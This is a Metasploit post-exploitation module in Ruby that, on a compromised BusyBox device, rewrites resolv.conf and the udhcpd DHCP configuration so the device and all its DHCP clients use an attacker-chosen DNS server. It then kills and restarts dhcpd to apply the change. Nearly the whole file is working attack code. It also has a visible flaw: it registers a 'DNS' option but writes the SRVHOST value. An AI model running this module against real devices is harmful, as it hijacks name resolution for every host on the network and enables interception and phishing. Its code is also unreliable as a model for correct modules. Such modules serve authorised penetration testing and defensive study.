##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Linux::BusyBox

  def initialize
    super(
      'Name'         => 'BusyBox DNS Configuration',
      'Description'  => %q{
        This module will be applied on a session connected to a BusyBox shell. It allows
        to set the DNS server on the device executing BusyBox so it will be sent by the
        DHCP server to network hosts.
      },
      'Author'       => 'Javier Vicente Vallejo',
      'License'      => MSF_LICENSE,
      'Platform'      => ['linux'],
      'SessionTypes'  => ['shell']
    )

    register_options(
      [
        OptAddress.new('DNS',   [ true, 'The dns server address' ])
      ])
  end

  def run
    print_status("Searching for files to modify dns server.")
    if busy_box_file_exist?('/etc/resolv.conf')
      modify_resolv_conf
    end

    if busy_box_file_exist?('/etc/udhcpd.conf')
      modify_udhcpd_conf
    end
  end

  def modify_resolv_conf
    print_status('File /etc/resolv.conf found')
    if busy_box_write_file('/etc/resolv.conf', "nameserver #{datastore['SRVHOST']}", false)
      print_good('DNS server added to resolv.conf')
    end
  end

  def modify_udhcpd_conf
    print_status('File /etc/udhcpd.conf found')

    if busy_box_write_file('/etc/udhcpd.conf', "option dns #{datastore['SRVHOST']}", true)
      restart_dhcpd('/etc/udhcpd.conf')
    else
      print_status('Unable to write udhcpd.conf, searching a writable directory...')
      writable_directory = busy_box_writable_dir
      if writable_directory
        print_status("Copying the original udhcpd.conf to #{writable_directory}tmp.conf")
        cmd_exec("cp -f /etc/udhcpd.conf #{writable_directory}tmp.conf")
        Rex::sleep(0.3)
        print_status("Adding DNS to #{writable_directory}tmp.conf")
        busy_box_write_file("#{writable_directory}tmp.conf", "option dns #{datastore['SRVHOST']}", true)
        restart_dhcpd("#{writable_directory}tmp.conf")
      else
        print_error('Writable directory not found')
      end
    end
  end

  def restart_dhcpd(conf)
    print_status('Restarting udhcp server')
    cmd_exec('killall dhcpd')
    # in this case it is necessary to use shell_write. Cmd_exec introduce an echo after the command
    # that is going to be executed: <command>;echo <rand_value>. It seems busybox fails to launch dhcpd
    # process when it is executed in this way: "dhcpd /etc/udhcpd.conf &; echo <rand_value>"
    session.shell_write("dhcpd #{conf} &\n")
    print_good('udhcpd.conf modified and DNS server added. DHCPD restarted')
  end
end
